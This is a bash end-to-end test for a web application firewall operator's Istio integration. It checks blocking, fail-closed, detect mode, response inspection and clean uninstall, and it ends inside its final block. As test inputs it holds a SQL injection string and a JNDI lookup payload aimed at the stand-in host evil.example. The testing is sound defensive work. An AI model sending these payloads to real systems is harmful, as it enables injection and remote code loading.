#!/usr/bin/env bash
# Copyright 2026 The Inkwall Authors
# SPDX-License-Identifier: Apache-2.0

# End-to-end test of the Istio integration on the kind cluster (#281):
# Istio installed with nothing about Inkwall (its base and istiod charts:
# the Gateway API implementation, no mesh), one WAFPolicy protecting an
# HTTPRoute served by two Istio Gateways (one naming the user's
# ConfigMap, one naming none), and another route on the same Gateways left
# unprotected. The engine joins the Gateways' pods, attacks are blocked on
# the protected route and pass on the other, a body attack is held back
# with its headers, a stopped engine fails closed, detect mode logs
# without blocking, and unprotecting or uninstalling leaves the user's
# objects as they were. WebSocket handshakes and gRPC calls through the
# Gateways (#369): an allowed handshake upgrades, one from another origin or
# with an attack gets 403; a gRPC (and gRPC-Web) call with an attack in its
# metadata gets HTTP 200 and the engine's gRPC status. Then Istio's own API (#281): an ingress gateway
# from Istio's gateway chart, an Istio Gateway and a protected
# VirtualService: the Pod webhook injects the engine into the gateway's
# pods, attacks on the VirtualService are blocked, another passes, and
# unprotecting and uninstalling unwire it. Needs the operator
# installed (make kind-operator) with istio-e2e among the proxy
# namespaces; ends with helm uninstall. KEEP=1 leaves the test's objects.
set -euo pipefail

cd "$(dirname "$0")/../.."
# The versions under test (#393).
# shellcheck source=hack/versions.env
. hack/versions.env

CLUSTER=${KIND_CLUSTER:-inkwall}
OPERATOR_NS=inkwall-system
# The Gateways, and so their pods (Istio runs them in the Gateway's
# namespace): a proxy namespace (hack/kind/operator.sh).
NS=istio-e2e
ISTIO_NS=istio-system
# Istio (ISTIO_VERSION), from its Helm charts, on the Gateway API's standard CRDs
# (GATEWAY_API_VERSION, as operator/go.mod).
ISTIO_REPO=https://blob.istio.io/istio-release/charts
HOST=istio.e2e.example.com
OPEN_HOST=open.istio.e2e.example.com
VS_HOST=vs.istio.e2e.example.com
VS_OPEN_HOST=open-vs.istio.e2e.example.com
CUSTOM_PORT=${E2E_ISTIO_PORT:-18093}
PLAIN_PORT=$((CUSTOM_PORT + 1))
VS_PORT=$((CUSTOM_PORT + 2))
KUBECTL=(kubectl --context "kind-$CLUSTER")
HELM=(helm --kube-context "kind-$CLUSTER")
SQLI='/?id=1%27%20OR%20%271%27%3D%271'
# The origin the policy allows WebSockets from, and another (#369).
WS_ORIGIN=https://app.e2e.example.com
WS_EVIL=https://evil.example
WS_IMAGE=inkwall-wsecho:e2e
GRPC_ATTACK="x-api-key=\${jndi:ldap://evil.example/a}"

# eventually retries for up to 3 minutes.
EVENTUALLY_TRIES=360
. hack/kind/lib.sh

if ! "${KUBECTL[@]}" -n "$OPERATOR_NS" get deployment/inkwall-operator >/dev/null 2>&1; then
  echo "the operator is not installed: run make kind-operator first" >&2
  exit 1
fi

pfs=()
work=$(mktemp -d)
gateway_api_installed=false
istio_installed=false
# The engines the engine-down step stopped, "node pid": resumed on exit too,
# so a failed run never leaves one stopped.
stopped=()
resume_engines() {
  local e
  for e in ${stopped[@]+"${stopped[@]}"}; do
    # shellcheck disable=SC2086 # "node pid"
    docker exec ${e% *} kill -CONT ${e#* } >/dev/null 2>&1 || true
  done
  stopped=()
}
cleanup() {
  resume_engines
  for pf in "${pfs[@]}"; do kill "$pf" 2>/dev/null || true; done
  if [[ ${KEEP:-} == 1 ]]; then
    rm -rf "$work"
    return
  fi
  "${KUBECTL[@]}" delete namespace "$NS" --ignore-not-found --timeout=120s >/dev/null 2>&1 || true
  if $istio_installed; then
    "${HELM[@]}" -n "$ISTIO_NS" uninstall istiod --wait >/dev/null 2>&1 || true
    "${HELM[@]}" -n "$ISTIO_NS" uninstall istio-base --wait >/dev/null 2>&1 || true
    "${KUBECTL[@]}" delete namespace "$ISTIO_NS" --ignore-not-found --timeout=120s >/dev/null 2>&1 || true
  fi
  if $gateway_api_installed; then "${KUBECTL[@]}" delete -f "$work/gateway-api.yaml" --ignore-not-found >/dev/null 2>&1 || true; fi
  rm -rf "$work"
}
trap cleanup EXIT

echo "== Istio $ISTIO_VERSION"
# The Gateway API's CRDs, unless installed already (as by another test).
if ! "${KUBECTL[@]}" get crd gateways.gateway.networking.k8s.io >/dev/null 2>&1; then
  curl -fsSL "https://github.com/kubernetes-sigs/gateway-api/releases/download/$GATEWAY_API_VERSION/standard-install.yaml" >"$work/gateway-api.yaml"
  gateway_api_installed=true
  "${KUBECTL[@]}" apply --server-side --force-conflicts -f "$work/gateway-api.yaml" >/dev/null
fi
if ! "${KUBECTL[@]}" -n "$ISTIO_NS" get deployment/istiod >/dev/null 2>&1; then
  istio_installed=true
  "${HELM[@]}" upgrade --install istio-base base --repo "$ISTIO_REPO" --version "$ISTIO_VERSION" \
    --namespace "$ISTIO_NS" --create-namespace --wait --timeout 5m >/dev/null
  "${HELM[@]}" upgrade --install istiod istiod --repo "$ISTIO_REPO" --version "$ISTIO_VERSION" \
    --namespace "$ISTIO_NS" --set pilot.resources.requests.cpu=100m --set pilot.resources.requests.memory=256Mi \
    --wait --timeout 5m >/dev/null
fi
ok "Istio installed"

# The WebSocket echo server (hack/wsecho), built here: test only, never
# released; and the clients.
mkdir -p "$work/wsimg"
CGO_ENABLED=0 go build -trimpath -o "$work/wsimg/wsecho" ./hack/wsecho
printf 'FROM gcr.io/distroless/static-debian12:nonroot\nCOPY wsecho /wsecho\nENTRYPOINT ["/wsecho"]\n' >"$work/wsimg/Dockerfile"
docker build -q -t "$WS_IMAGE" "$work/wsimg" >/dev/null
kind load docker-image "$WS_IMAGE" --name "$CLUSTER" >/dev/null
go build -o "$work/grpchealth" ./hack/grpchealth
go build -o "$work/wsecho" ./hack/wsecho
printf '\0\0\0\0\0' >"$work/grpc-empty"

# The user's objects: an app, a ConfigMap customizing a Gateway's pods
# (a label), a Gateway naming it, one naming none, the protected route on
# both and an unprotected one.
"${KUBECTL[@]}" create namespace "$NS" --dry-run=client -o yaml | "${KUBECTL[@]}" apply -f - >/dev/null
"${KUBECTL[@]}" apply -f - >/dev/null <<YAML
apiVersion: apps/v1
kind: Deployment
metadata: {name: app, namespace: $NS}
spec:
  selector: {matchLabels: {app: istio-e2e}}
  template:
    metadata: {labels: {app: istio-e2e}}
    spec:
      containers:
        - name: app
          image: traefik/whoami:$WHOAMI_VERSION
          # --verbose logs each request: the held-body check looks for one.
          args: ["--port", "8080", "--verbose"]
---
apiVersion: v1
kind: Service
metadata: {name: app, namespace: $NS}
spec:
  selector: {app: istio-e2e}
  ports: [{name: http, port: 8080}]
---
# A gRPC service: grpc.health.v1.Health, over h2c.
apiVersion: apps/v1
kind: Deployment
metadata: {name: grpc, namespace: $NS}
spec:
  selector: {matchLabels: {app: istio-e2e-grpc}}
  template:
    metadata: {labels: {app: istio-e2e-grpc}}
    spec:
      containers:
        - name: grpc
          image: registry.k8s.io/e2e-test-images/agnhost:$AGNHOST_VERSION
          args: ["grpc-health-checking", "--port", "5000"]
---
apiVersion: v1
kind: Service
metadata: {name: grpc, namespace: $NS}
spec:
  selector: {app: istio-e2e-grpc}
  # Istio's protocol selection: HTTP/2 to the backend.
  ports: [{name: grpc, port: 5000, appProtocol: grpc}]
---
# A WebSocket echo server.
apiVersion: apps/v1
kind: Deployment
metadata: {name: wsecho, namespace: $NS}
spec:
  selector: {matchLabels: {app: istio-e2e-wsecho}}
  template:
    metadata: {labels: {app: istio-e2e-wsecho}}
    spec:
      containers:
        - name: wsecho
          image: $WS_IMAGE
          imagePullPolicy: Never
          args: ["-listen", ":8080"]
---
apiVersion: v1
kind: Service
metadata: {name: wsecho, namespace: $NS}
spec:
  selector: {app: istio-e2e-wsecho}
  ports: [{name: http, port: 8080}]
---
apiVersion: v1
kind: ConfigMap
metadata: {name: custom-params, namespace: $NS}
data:
  deployment: |
    # The user's: a label on the Gateway's pods.
    spec:
      template:
        metadata:
          labels: {e2e: custom}
---
apiVersion: gateway.networking.k8s.io/v1
kind: Gateway
metadata:
  name: custom
  namespace: $NS
  # No load balancer on kind.
  annotations: {networking.istio.io/service-type: ClusterIP}
spec:
  gatewayClassName: istio
  infrastructure:
    parametersRef: {group: "", kind: ConfigMap, name: custom-params}
  listeners: [{name: http, protocol: HTTP, port: 80}]
---
apiVersion: gateway.networking.k8s.io/v1
kind: Gateway
metadata:
  name: plain
  namespace: $NS
  annotations: {networking.istio.io/service-type: ClusterIP}
spec:
  gatewayClassName: istio
  listeners: [{name: http, protocol: HTTP, port: 80}]
---
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata: {name: app, namespace: $NS}
spec:
  parentRefs: [{name: custom}, {name: plain}]
  hostnames: [$HOST]
  rules:
    - name: web
      backendRefs: [{name: app, port: 8080}]
    - name: grpc
      matches: [{path: {type: PathPrefix, value: /grpc.health.v1.Health/}}]
      backendRefs: [{name: grpc, port: 5000}]
    - name: ws
      matches: [{path: {type: PathPrefix, value: /ws}}]
      backendRefs: [{name: wsecho, port: 8080}]
---
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata: {name: open, namespace: $NS}
spec:
  parentRefs: [{name: custom}, {name: plain}]
  hostnames: [$OPEN_HOST]
  rules:
    - backendRefs: [{name: app, port: 8080}]
YAML
for d in app grpc wsecho; do
  "${KUBECTL[@]}" -n "$NS" rollout status "deployment/$d" --timeout=120s >/dev/null
done

# What the user wrote, to compare with after the operator is gone.
user_objects() {
  "${KUBECTL[@]}" -n "$NS" get configmap custom-params -o jsonpath='{.metadata.labels}{.metadata.annotations}{.data}'
  echo
  "${KUBECTL[@]}" -n "$NS" get gateway custom plain -o jsonpath='{range .items[*]}{.metadata.annotations}{.spec}{"\n"}{end}'
}
as_they_were() { [[ $(user_objects) == "$original" ]]; }
original=$(user_objects)

# gateway_pods GATEWAY: its running pods and their init containers, one per
# line.
gateway_pods() {
  "${KUBECTL[@]}" -n "$NS" get pods -l "gateway.networking.k8s.io/gateway-name=$1" \
    -o jsonpath='{range .items[*]}{.metadata.deletionTimestamp}|{.status.phase}|{.spec.initContainers[*].name}{"\n"}{end}' | grep '^|Running|'
}
injected() { local p; p=$(gateway_pods "$1") && ! grep -qv '^|Running|inkwall-engine' <<<"$p"; }
not_injected() { local p; p=$(gateway_pods "$1") && ! grep -q inkwall-engine <<<"$p"; }
# A port-forward follows a pod: forward again after a rollout.
forward_all() {
  for pf in "${pfs[@]}"; do kill "$pf" 2>/dev/null || true; done
  pfs=()
  "${KUBECTL[@]}" -n "$NS" port-forward svc/custom-istio "$CUSTOM_PORT:80" >/dev/null 2>&1 &
  pfs+=($!)
  "${KUBECTL[@]}" -n "$NS" port-forward svc/plain-istio "$PLAIN_PORT:80" >/dev/null 2>&1 &
  pfs+=($!)
  sleep 1
}
# code PORT HOST PATH [CURL_ARGS...]
code() {
  local port=$1 host=$2 path=$3
  shift 3
  curl -s -o /dev/null -w '%{http_code}' -H "Host: $host" "$@" "http://127.0.0.1:$port$path" || true
}
# both_are STATUS PATH [CURL_ARGS...]: the protected route, through both
# Gateways.
both_are() {
  local want=$1
  shift
  for port in "$CUSTOM_PORT" "$PLAIN_PORT"; do
    [[ $(code "$port" "$HOST" "$@") == "$want" ]] || return 1
  done
}
# open_are STATUS PATH: the unprotected route, through both Gateways.
open_are() {
  local want=$1
  shift
  for port in "$CUSTOM_PORT" "$PLAIN_PORT"; do
    [[ $(code "$port" "$OPEN_HOST" "$@") == "$want" ]] || return 1
  done
}
condition() {
  "${KUBECTL[@]}" -n "$NS" get wafpolicy shared -o jsonpath="{.status.conditions[?(@.type==\"$1\")].$2}" 2>/dev/null
}
ready() { [[ $(condition Ready status) == True ]]; }
programmed() { [[ $(condition Programmed status) == True && $(condition Programmed message) == *"wired to the engine in Istio"* ]]; }
# policy [MODE [SPEC]]: the policy, in Block mode by default, with SPEC
# (indented YAML) added.
policy() {
  "${KUBECTL[@]}" apply --server-side -f - >/dev/null <<YAML
apiVersion: waf.inkwall.dev/v1alpha1
kind: WAFPolicy
metadata: {name: shared, namespace: $NS}
spec:
  targetRefs:
    - {group: gateway.networking.k8s.io, kind: HTTPRoute, name: app}
  mode: ${1:-Block}
  # CRS on the 48 KB form field below, on a CI runner, can pass the
  # default 250 ms. Envoy waits 500 ms longer than this.
  timeout: 1s
  webSocket:
    allowedOrigins: ["$WS_ORIGIN"]
${2:-}
YAML
}
RESPONSES='  responses: {inspect: true}'
# whoami echoes the request's headers in its text/plain body: this one makes
# it leak a MySQL error, which the request rules don't mind.
LEAK='X-Debug: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version'
# responses_sent MODE: both Gateways' EnvoyFilters send the responses, held
# (BUFFERED_PARTIAL) or streamed (STREAMED) (#374).
responses_sent() {
  for gw in custom plain; do
    "${KUBECTL[@]}" -n "$NS" get envoyfilter "inkwall-waf-$gw" -o json | grep "\"response_body_mode\": *\"$1\"" >/dev/null || return 1
  done
}
# leak_is STATUS PORT HOST...: the leaking response's status through each.
leak_is() {
  local want=$1 port=$2
  shift 2
  for host in "$@"; do
    [[ $(code "$port" "$host" /leak -H "$LEAK") == "$want" ]] || return 1
  done
}
leak_replaced() {
  for port in "$CUSTOM_PORT" "$PLAIN_PORT"; do
    ! curl -s -H "Host: $HOST" -H "$LEAK" "http://127.0.0.1:$port/leak" | grep -qF 'SQL syntax' || return 1
  done
}
# logged_response SELECTOR ACTION PATH: an engine of the pods SELECTOR
# selects logged a response event for PATH.
logged_response() {
  "${KUBECTL[@]}" -n "$NS" logs -l "$1" -c inkwall-engine --tail=-1 |
    grep '"security event"' | grep '"phase":"response"' | grep "\"action\":\"$2\"" | grep "\"path\":\"$3\"" >/dev/null
}
# grpc_are CODE [KEY=VALUE...]: a gRPC call (grpc.health.v1.Health/Check)
# with that metadata ends with that status code, through both Gateways.
grpc_are() {
  local want=$1 md=() port
  shift
  for kv in "$@"; do md+=(-metadata "$kv"); done
  for port in "$CUSTOM_PORT" "$PLAIN_PORT"; do
    [[ $("$work/grpchealth" -authority "$HOST" "${md[@]}" "127.0.0.1:$port") == "$want" ]] || return 1
  done
}
# grpc_denied_by_engine [KEY=VALUE...]: ... is PermissionDenied with the
# engine's grpc-message, which names the request ID (a denial Envoy turned
# into a gRPC status itself would not).
grpc_denied_by_engine() {
  local md=() port out
  for kv in "$@"; do md+=(-metadata "$kv"); done
  for port in "$CUSTOM_PORT" "$PLAIN_PORT"; do
    out=$("$work/grpchealth" -authority "$HOST" "${md[@]}" "127.0.0.1:$port" 2>&1) || return 1
    [[ $out == *"grpchealth: Forbidden (request ID "*")"*PermissionDenied ]] || return 1
  done
}
# grpc_web_denied: a gRPC-Web call (curl, HTTP/1.1) with an attack in its
# metadata gets HTTP 200 and grpc-status 7, through both Gateways.
grpc_web_denied() {
  local port got
  for port in "$CUSTOM_PORT" "$PLAIN_PORT"; do
    got=$(curl -s -o /dev/null -D - -H "Host: $HOST" -H 'Content-Type: application/grpc-web+proto' -H 'X-Grpc-Web: 1' \
      -H "X-Api-Key: \${jndi:ldap://evil.example/a}" --data-binary "@$work/grpc-empty" \
      "http://127.0.0.1:$port/grpc.health.v1.Health/Check" |
      tr -d '\r' | awk 'NR == 1 { code = $2 } tolower($1) == "grpc-status:" { grpc = $2 } END { print code, grpc }' || true)
    [[ $got == "200 7" ]] || return 1
  done
}
# ws_are RESULT PATH [ORIGIN]: a WebSocket handshake from ORIGIN (default:
# the allowed one) ends with RESULT through both Gateways: "upgraded" (101,
# and a message echoed) or the status it got instead.
ws_are() {
  local want=$1 path=$2 origin=${3:-$WS_ORIGIN} port
  for port in "$CUSTOM_PORT" "$PLAIN_PORT"; do
    [[ $("$work/wsecho" -host "$HOST" -origin "$origin" "127.0.0.1:$port$path") == "$want" ]] || return 1
  done
}
has_sidecar() {
  "${KUBECTL[@]}" -n "$NS" get configmap custom-params -o jsonpath='{.data.deployment}' | grep 'name: inkwall-engine' >/dev/null
}
names_ours() {
  [[ $("${KUBECTL[@]}" -n "$NS" get gateway plain -o jsonpath='{.spec.infrastructure.parametersRef.kind}/{.spec.infrastructure.parametersRef.name}') == ConfigMap/inkwall-waf-plain ]]
}
filters() {
  "${KUBECTL[@]}" -n "$NS" get envoyfilter inkwall-waf-custom inkwall-waf-plain -o name >/dev/null
}
observability() {
  for gw in custom plain; do
    "${KUBECTL[@]}" -n "$NS" get envoyfilter "inkwall-waf-$gw" -o jsonpath='{.spec.configPatches[*].patch.value.typed_config.observability_mode}' | grep true >/dev/null || return 1
  done
}
labelled() { "${KUBECTL[@]}" -n "$NS" get pods -l e2e=custom -o name | grep . >/dev/null; }
# whoami --verbose logs the request line of each request it gets.
never_reached_app() { ! "${KUBECTL[@]}" -n "$NS" logs deployment/app --since=10m | grep -i "$1" >/dev/null; }
reached_app() { "${KUBECTL[@]}" -n "$NS" logs deployment/app --since=10m | grep -i "$1" >/dev/null; }
# logged PATH: an engine in the Gateways' pods logged a detect-mode event
# for PATH.
logged() {
  "${KUBECTL[@]}" -n "$NS" logs -l gateway.istio.io/managed=istio.io-gateway-controller -c inkwall-engine --tail=-1 |
    grep '"security event"' | grep '"action":"log"' | grep "\"path\":\"$1\"" >/dev/null
}
no_wiring() {
  ! "${KUBECTL[@]}" -n "$NS" get envoyfilter -l app.kubernetes.io/managed-by=inkwall-operator -o name 2>/dev/null | grep . &&
    ! "${KUBECTL[@]}" -n "$NS" get configmap inkwall-waf-plain >/dev/null 2>&1
}

for gw in custom plain; do
  eventually "Istio runs Gateway $gw" gateway_pods "$gw"
done
forward_all
eventually "the Gateways serve the app" both_are 200 /
check "no policy yet: the attack passes" both_are 200 "$SQLI"
eventually "the Gateways serve the gRPC service" grpc_are OK
eventually "the Gateways upgrade a WebSocket" ws_are upgraded /ws
check "no policy yet: any origin upgrades" ws_are upgraded /ws "$WS_EVIL"

echo "== block mode"
policy
eventually "the user's ConfigMap gets the engine" has_sidecar
eventually "Gateway plain names the operator's ConfigMap" names_ours
for gw in custom plain; do
  eventually "Istio replaced Gateway $gw's pods with ones that have the engine" injected "$gw"
done
eventually "an EnvoyFilter on each Gateway" filters
eventually "Programmed through Istio" programmed
eventually "the policy is Ready" ready
forward_all
eventually "the attack is blocked through both Gateways" both_are 403 "$SQLI"
check "benign traffic passes" both_are 200 /products/42
check "the unprotected route lets the attack through" open_are 200 "$SQLI"
check "the user's pod label is kept" labelled
check "a gRPC call passes" grpc_are OK
check "a gRPC call with an attack in its metadata gets the engine's gRPC status" grpc_denied_by_engine "$GRPC_ATTACK"
check "a gRPC-Web call with an attack gets HTTP 200 and grpc-status 7" grpc_web_denied
check "a WebSocket from the allowed origin upgrades and echoes" ws_are upgraded /ws
check "a WebSocket from another origin gets 403, no upgrade" ws_are 403 /ws "$WS_EVIL"
check "a WebSocket with an attack in its URL gets 403" ws_are 403 "/ws?room=1%27%20OR%20%271%27%3D%271"
{
  printf x=
  head -c 48000 /dev/zero | tr '\0' a
} >"$work/big"
check "a 48 KB benign body passes" both_are 200 / -H 'Content-Type: application/x-www-form-urlencoded' --data-binary "@$work/big"
check "an attack in the body is blocked" both_are 403 / --data-urlencode "q=1' OR '1'='1"
# BUFFERED_PARTIAL: Envoy holds the headers until the engine has seen the
# body, so the app never sees the blocked request.
mark=/held-$RANDOM$RANDOM
check "a body attack on a marked path is blocked" both_are 403 "$mark" --data-urlencode "q=1' OR '1'='1"
check "and never reached the app" never_reached_app "$mark"

echo "== engine down"
# The engine of every pod of both Gateways stopped (SIGSTOP, sent on the
# kind node: the engine's image has no shell, and an ephemeral container
# can't share the process namespace of an init container): Envoy gets no
# answer and, the policy failing closed, rejects the request (504 once
# message_timeout passes) instead of letting it through. The open route
# doesn't call the engine.
# settled: Istio has finished rolling both Gateways' Deployments (it can
# render one twice as the operator sets it up), and none of their pods is
# terminating: the pods the step stops are the ones serving.
settled() {
  local gw
  for gw in custom plain; do
    "${KUBECTL[@]}" -n "$NS" rollout status "deployment/$gw-istio" --timeout=10s >/dev/null || return 1
  done
  ! "${KUBECTL[@]}" -n "$NS" get pods -l gateway.istio.io/managed=istio.io-gateway-controller \
    -o jsonpath='{range .items[*]}{.metadata.deletionTimestamp}{"\n"}{end}' | grep . >/dev/null
}
# stop_engines: stops the engine of every Gateway pod, read in one list at
# the moment of use (no pod looked up by a name read earlier), and records
# them in stopped. Fails, stopping none, unless every running pod of both
# Gateways has a running engine.
stop_engines() {
  local line gw node cid pid seen="" targets=()
  while IFS='|' read -r gw node cid; do
    [[ -n $gw ]] || continue
    [[ -n $cid ]] || return 1
    pid=$(docker exec "$node" crictl inspect --output go-template --template '{{.info.pid}}' "${cid#*://}") || return 1
    [[ $pid =~ ^[0-9]+$ && $pid != 0 ]] || return 1
    targets+=("$node $pid")
    seen+=" $gw"
  done < <("${KUBECTL[@]}" -n "$NS" get pods -l gateway.istio.io/managed=istio.io-gateway-controller \
    --field-selector=status.phase=Running \
    -o jsonpath='{range .items[*]}{.metadata.labels.gateway\.networking\.k8s\.io/gateway-name}|{.spec.nodeName}|{.status.initContainerStatuses[?(@.name=="inkwall-engine")].containerID}{"\n"}{end}')
  [[ $seen == *" custom"* && $seen == *" plain"* ]] || return 1
  for line in "${targets[@]}"; do
    # shellcheck disable=SC2086 # "node pid"
    docker exec ${line% *} kill -STOP ${line#* } || return 1
    stopped+=("$line")
  done
}
# fails_closed PATH: through both Gateways, a 5xx, not the app's answer.
fails_closed() {
  local port c
  for port in "$CUSTOM_PORT" "$PLAIN_PORT"; do
    c=$(code "$port" "$HOST" "$1" --max-time 10)
    [[ $c == 5?? ]] || return 1
  done
}
eventually "Istio's Gateway rollouts are done" settled
forward_all
eventually "the engines of both Gateways are stopped" stop_engines
eventually "engine down: a benign request is refused (fails closed)" fails_closed /
check "engine down: an attack is refused" fails_closed "$SQLI"
check "engine down: the unprotected route still answers" open_are 200 /
resume_engines
eventually "engine back: benign traffic passes" both_are 200 /
eventually "engine back: the attack is blocked" both_are 403 "$SQLI"

echo "== detect mode"
policy Detect
eventually "the EnvoyFilters in observability mode" observability
eventually "the attack passes through both Gateways" both_are 200 "$SQLI"
probe=/detect-$RANDOM$RANDOM
check "an attack on a fresh path passes" both_are 200 "$probe?id=1%27%20OR%20%271%27%3D%271"
eventually "and the engines log it" logged "$probe"
body_path=/detect-body-$RANDOM$RANDOM
check "a body attack passes" both_are 200 "$body_path" --data-urlencode "q=1' OR '1'='1"
eventually "and reaches the app" reached_app "$body_path"
eventually "the engines log the streamed body's attack" logged "$body_path"

echo "== responses"
# Inspected through Istio since #374: a leak is replaced in Block mode,
# logged in Detect mode, and the policy is Programmed.
policy Block "$RESPONSES"
eventually "the EnvoyFilters send the responses, held" responses_sent BUFFERED_PARTIAL
eventually "Programmed with responses" programmed
forward_all
eventually "a response leaking a SQL error is replaced through both Gateways: 403" leak_is 403 "$CUSTOM_PORT" "$HOST"
check "and through the other Gateway" leak_is 403 "$PLAIN_PORT" "$HOST"
check "its body is gone" leak_replaced
check "a clean response passes" both_are 200 /products/42
check "the unprotected route lets the leak through" leak_is 200 "$CUSTOM_PORT" "$OPEN_HOST"
eventually "the engines log it as a response deny" logged_response gateway.istio.io/managed=istio.io-gateway-controller deny /leak
policy Detect "$RESPONSES"
eventually "the EnvoyFilters stream the responses in detect mode" responses_sent STREAMED
forward_all
eventually "detect mode: the leak passes" leak_is 200 "$CUSTOM_PORT" "$HOST"
eventually "and the engines log it" logged_response gateway.istio.io/managed=istio.io-gateway-controller log /leak

echo "== unprotected"
"${KUBECTL[@]}" -n "$NS" delete wafpolicy shared --timeout=60s >/dev/null
eventually "the operator's Istio objects are gone" no_wiring
eventually "the user's ConfigMap and Gateways are as they were" as_they_were
for gw in custom plain; do
  eventually "Gateway $gw's pods no longer have the engine" not_injected "$gw"
done
forward_all
eventually "the attack passes again" both_are 200 "$SQLI"

echo "== Istio's ingress gateway (VirtualService)"
# Istio's own API: an ingress gateway from its gateway chart (release
# istio-ingressgateway: pods labelled istio=ingressgateway, which the Pod
# webhook injects when they start, here after the operator), an Istio
# Gateway selecting it, a protected VirtualService and an unprotected one.
"${HELM[@]}" upgrade --install istio-ingressgateway gateway --repo "$ISTIO_REPO" --version "$ISTIO_VERSION" \
  --namespace "$NS" --set service.type=ClusterIP --wait --timeout 5m >/dev/null
"${KUBECTL[@]}" apply -f - >/dev/null <<YAML
apiVersion: networking.istio.io/v1
kind: Gateway
metadata: {name: ingress, namespace: $NS}
spec:
  selector: {istio: ingressgateway}
  servers: [{port: {number: 80, name: http, protocol: HTTP}, hosts: ["*"]}]
---
apiVersion: networking.istio.io/v1
kind: VirtualService
metadata: {name: shop-vs, namespace: $NS}
spec:
  hosts: [$VS_HOST]
  gateways: [ingress]
  http:
    - name: e2e-vs-api
      match: [{uri: {prefix: /api/}}]
      route: [{destination: {host: app, port: {number: 8080}}}]
    - name: e2e-vs-web
      route: [{destination: {host: app, port: {number: 8080}}}]
---
apiVersion: networking.istio.io/v1
kind: VirtualService
metadata: {name: open-vs, namespace: $NS}
spec:
  hosts: [$VS_OPEN_HOST]
  gateways: [ingress]
  http:
    - name: e2e-vs-open
      route: [{destination: {host: app, port: {number: 8080}}}]
YAML
# ingress_pods: the ingress gateway's running pods, their init containers
# and istio-proxy's mounts, one per line.
ingress_pods() {
  "${KUBECTL[@]}" -n "$NS" get pods -l istio=ingressgateway \
    -o jsonpath='{range .items[*]}{.metadata.deletionTimestamp}|{.status.phase}|{.spec.initContainers[*].name}|{.spec.containers[?(@.name=="istio-proxy")].volumeMounts[*].name}{"\n"}{end}' | grep '^|Running|'
}
ingress_injected() { local p; p=$(ingress_pods) && ! grep -v '^|Running|inkwall-engine|.*inkwall-socket' <<<"$p" >/dev/null; }
forward_vs() {
  # The previous one may be gone already: forward_all stops it too. A
  # failed kill must not end the script (set -e).
  if [[ -n ${vs_pf:-} ]]; then kill "$vs_pf" 2>/dev/null || true; fi
  "${KUBECTL[@]}" -n "$NS" port-forward svc/istio-ingressgateway "$VS_PORT:80" >/dev/null 2>&1 &
  vs_pf=$!
  pfs+=("$vs_pf")
  sleep 1
}
vs_is() { [[ $(code "$VS_PORT" "$VS_HOST" "${@:2}") == "$1" ]]; }
vs_open_is() { [[ $(code "$VS_PORT" "$VS_OPEN_HOST" "${@:2}") == "$1" ]]; }
vs_condition() {
  "${KUBECTL[@]}" -n "$NS" get wafpolicy vs -o jsonpath="{.status.conditions[?(@.type==\"$1\")].$2}" 2>/dev/null
}
vs_programmed() { [[ $(vs_condition Programmed status) == True && $(vs_condition Programmed message) == *"VirtualService(s) wired to the engine in Istio ingress gateway"* ]]; }
vs_ready() { [[ $(vs_condition Ready status) == True ]]; }
# vs_policy [MODE [SPEC]]: as policy, on the VirtualService.
vs_policy() {
  "${KUBECTL[@]}" apply --server-side -f - >/dev/null <<YAML
apiVersion: waf.inkwall.dev/v1alpha1
kind: WAFPolicy
metadata: {name: vs, namespace: $NS}
spec:
  targetRefs:
    - {group: networking.istio.io, kind: VirtualService, name: shop-vs}
  mode: ${1:-Block}
  timeout: 1s
${2:-}
YAML
}
vs_filter() { "${KUBECTL[@]}" -n "$NS" get envoyfilter inkwall-istio-ingress -o name >/dev/null 2>&1; }
no_vs_filter() { ! vs_filter; }

eventually "the ingress gateway's pods start with the engine, its socket mounted in istio-proxy" ingress_injected
forward_vs
eventually "the ingress gateway serves the VirtualServices" vs_is 200 /api/
check "no policy yet: the attack passes" vs_is 200 "/api$SQLI"
vs_policy
eventually "an EnvoyFilter for the ingress gateway's pods" vs_filter
eventually "Programmed through Istio's ingress gateway" vs_programmed
eventually "the policy on the VirtualService is Ready" vs_ready
eventually "an attack on its first http route is blocked" vs_is 403 "/api$SQLI"
check "and on its second (Istio's route names hold)" vs_is 403 "/web$SQLI"
check "benign traffic passes" vs_is 200 /api/products/42
check "the unprotected VirtualService lets the attack through" vs_open_is 200 "$SQLI"
check "an attack in the body is blocked" vs_is 403 /api/ --data-urlencode "q=1' OR '1'='1"
vs_policy Block "$RESPONSES"
eventually "VirtualService, responses: a leak is replaced: 403" leak_is 403 "$VS_PORT" "$VS_HOST"
check "a clean response passes" vs_is 200 /api/products/42
check "the unprotected VirtualService lets the leak through" leak_is 200 "$VS_PORT" "$VS_OPEN_HOST"
eventually "the ingress gateway's engine logs it as a response deny" logged_response istio=ingressgateway deny /leak
vs_policy Detect "$RESPONSES"
eventually "VirtualService, detect mode: the leak passes" leak_is 200 "$VS_PORT" "$VS_HOST"
eventually "and the engine logs it" logged_response istio=ingressgateway log /leak
vs_policy
"${KUBECTL[@]}" -n "$NS" delete wafpolicy vs --timeout=60s >/dev/null
eventually "unprotected: the EnvoyFilter is gone" no_vs_filter
eventually "and the attack passes again" vs_is 200 "/api$SQLI"
# Protected again: the uninstall below unwires it too.
vs_policy
eventually "Programmed again" vs_programmed
eventually "blocking again" vs_is 403 "/api$SQLI"

echo "== uninstall"
policy
for gw in custom plain; do
  eventually "Gateway $gw's pods have the engine again" injected "$gw"
done
eventually "Programmed again" programmed
forward_all
eventually "blocking again" both_are 403 "$SQLI"
if "${HELM[@]}" uninstall inkwall --namespace "$OPERATOR_NS" --wait --timeout 5m >/dev/null; then
  ok "helm uninstall (with the unwire hook)"
else
  fail "helm uninstall"
fi
check "the operator's Istio objects are gone" no_wiring
check "the user's ConfigMap and Gateways are as they were" as_they_were
for gw in custom plain; do
  eventually "Gateway $gw's pods no longer have the engine" not_injected "$gw"
done
forward_all
eventually "the routes still answer after the uninstall (uninspected)" both_are 200 "$SQLI"
# forward_all stopped this one too.
forward_vs
eventually "the VirtualService still answers after the uninstall (uninspected)" vs_is 200 "/api$SQLI"
"${KUBECTL[@]}" -n "$NS" delete wafpolicy vs --ignore-not-found --timeout=30s >/dev/null || true
"${KUBECTL[@]}" -n "$NS" delete wafpolicy shared --ignore-not-found --timeout=30s >/dev/null || true

if [[ $failures -gt 0 ]]; then
  echo "$failures check(s) failed; operator and istiod logs:"
